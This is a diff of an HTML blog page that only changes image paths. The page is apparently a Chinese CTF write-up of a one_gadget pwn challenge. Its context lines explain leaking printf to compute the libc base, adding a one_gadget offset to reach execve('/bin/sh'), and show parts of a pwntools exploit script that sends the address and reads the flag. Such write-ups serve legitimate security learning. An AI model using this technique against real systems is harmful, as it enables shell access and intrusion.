@@ -38,12 +38,12 @@
 <p>考点：</p>
 <p>1、one_gadget小工具的使用</p>
 <p>2、libc基地址的计算，利用基地址得出其他libc函数的地址</p>
-<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200323224603541.png" alt="image-20200323224603541"></p>
-<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200323224754035.png" alt="image-20200323224754035"></p>
+<p><img src="/images/image-20200323224603541.png" alt="image-20200323224603541"></p>
+<p><img src="/images/image-20200323224754035.png" alt="image-20200323224754035"></p>
 <p>从main函数来看v4是个函数指针，传入一个函数地址就能执行，但是这里的v4是用%ld接收的所以传入的地址要是10进制的数字串，%ld表示数据按十进制有符号长型整数输入或输出</p>
-<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200323224820771.png" alt="image-20200323224820771"></p>
+<p><img src="/images/image-20200323224820771.png" alt="image-20200323224820771"></p>
 <p>有个init，直接打印出printf函数的真实地址，这样就可以通过这个地址减去libc中printf的偏移得到基地址，从而用基地址+one_gadget在libc中的偏移得出execve(&quot;/bin/sh&quot;)的地址，在传给程序就能getshell</p>
-<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200323231722663.png" alt="image-20200323231722663"></p>
+<p><img src="/images/image-20200323231722663.png" alt="image-20200323231722663"></p>
 <p>选择0x106ef8这个one_gadget</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python2</span>
 <span style="color:#75715e">#-*- coding=UTF-8 -*-</span>
@@ -71,7 +71,7 @@ payload <span style="color:#f92672">=</span> str(one_gadget) <span style="color:
 sh<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">one gadget:</span><span style="color:#e6db74">&#39;</span>,payload)
 sh<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">cat flag</span><span style="color:#e6db74">&#39;</span>)
 sh<span style="color:#f92672">.</span>interactive()
-</code></pre></div><p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200323231540907.png" alt="image-20200323231540907"></p>
+</code></pre></div><p><img src="/images/image-20200323231540907.png" alt="image-20200323231540907"></p>
 
 </main>
 
